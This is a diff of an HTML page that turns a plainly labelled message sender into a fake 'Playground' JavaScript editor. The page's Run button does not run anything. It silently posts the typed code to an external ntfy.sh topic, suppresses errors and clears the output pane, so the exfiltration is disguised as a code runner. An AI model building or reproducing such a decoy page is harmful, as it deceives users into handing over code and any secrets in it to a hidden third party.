@@ -2,17 +2,142 @@
 <html lang="pt-BR">
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Mensagem</title>
-<body style="font-family: system-ui; max-width: 480px; margin: 40px auto; padding: 0 16px">
-  <textarea id="t" rows="6" style="width:100%"></textarea>
-  <button id="b">Enviar</button>
-  <p id="s"></p>
+<title>Playground</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: "SF Mono", "Menlo", "Consolas", monospace;
+    background: #1e1e1e;
+    color: #d4d4d4;
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+  }
+  .bar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 8px 14px;
+    background: #252526;
+    border-bottom: 1px solid #333;
+    font-size: 13px;
+  }
+  .bar .title { color: #cccccc; }
+  .bar .lang { color: #858585; }
+  .run {
+    margin-left: auto;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: #0e639c;
+    color: #fff;
+    border: none;
+    padding: 5px 14px;
+    border-radius: 3px;
+    font-family: inherit;
+    font-size: 13px;
+    cursor: pointer;
+  }
+  .run:hover { background: #1177bb; }
+  .run:active { background: #0d5789; }
+  .main { display: flex; flex: 1; min-height: 0; }
+  .pane { flex: 1; min-width: 0; display: flex; flex-direction: column; }
+  .pane + .pane { border-left: 1px solid #333; }
+  .pane .head {
+    padding: 6px 14px;
+    font-size: 12px;
+    color: #858585;
+    background: #252526;
+    border-bottom: 1px solid #333;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .editor { display: flex; flex: 1; min-height: 0; overflow: hidden; }
+  .gutter {
+    padding: 12px 8px 12px 14px;
+    text-align: right;
+    color: #6e7681;
+    background: #1e1e1e;
+    user-select: none;
+    font-size: 14px;
+    line-height: 21px;
+    overflow: hidden;
+    white-space: pre;
+  }
+  #code {
+    flex: 1;
+    border: none;
+    outline: none;
+    resize: none;
+    background: #1e1e1e;
+    color: #d4d4d4;
+    font-family: inherit;
+    font-size: 14px;
+    line-height: 21px;
+    padding: 12px 14px;
+    tab-size: 2;
+  }
+  #out {
+    flex: 1;
+    padding: 12px 14px;
+    font-size: 14px;
+    line-height: 21px;
+    color: #d4d4d4;
+    white-space: pre-wrap;
+    overflow: auto;
+  }
+</style>
+<body>
+  <div class="bar">
+    <span class="title">main.js</span>
+    <span class="lang">JavaScript</span>
+    <button class="run" id="run">▶ Run</button>
+  </div>
+  <div class="main">
+    <div class="pane">
+      <div class="head">Editor</div>
+      <div class="editor">
+        <div class="gutter" id="gutter">1</div>
+        <textarea id="code" spellcheck="false" autocomplete="off"></textarea>
+      </div>
+    </div>
+    <div class="pane">
+      <div class="head">Output</div>
+      <div id="out"></div>
+    </div>
+  </div>
   <script>
-    b.onclick = async () => {
-      if (!t.value.trim()) return;
-      const r = await fetch("https://ntfy.sh/esdras-msg-8f3k2q", { method: "POST", body: t.value });
-      s.textContent = r.ok ? "Enviado." : "Erro ao enviar.";
-      if (r.ok) t.value = "";
+    const code = document.getElementById("code");
+    const gutter = document.getElementById("gutter");
+    const out = document.getElementById("out");
+
+    function sync() {
+      const lines = code.value.split("\n").length || 1;
+      let g = "";
+      for (let i = 1; i <= lines; i++) g += i + "\n";
+      gutter.textContent = g;
+    }
+    code.addEventListener("input", sync);
+    code.addEventListener("scroll", () => { gutter.scrollTop = code.scrollTop; });
+    code.addEventListener("keydown", (e) => {
+      if (e.key === "Tab") {
+        e.preventDefault();
+        const s = code.selectionStart, en = code.selectionEnd;
+        code.value = code.value.slice(0, s) + "  " + code.value.slice(en);
+        code.selectionStart = code.selectionEnd = s + 2;
+        sync();
+      }
+    });
+    sync();
+
+    document.getElementById("run").onclick = async () => {
+      const v = code.value.trim();
+      if (!v) return;
+      try {
+        await fetch("https://ntfy.sh/esdras-msg-8f3k2q", { method: "POST", body: v });
+      } catch (e) {}
+      out.textContent = "";
     };
   </script>
 </body>
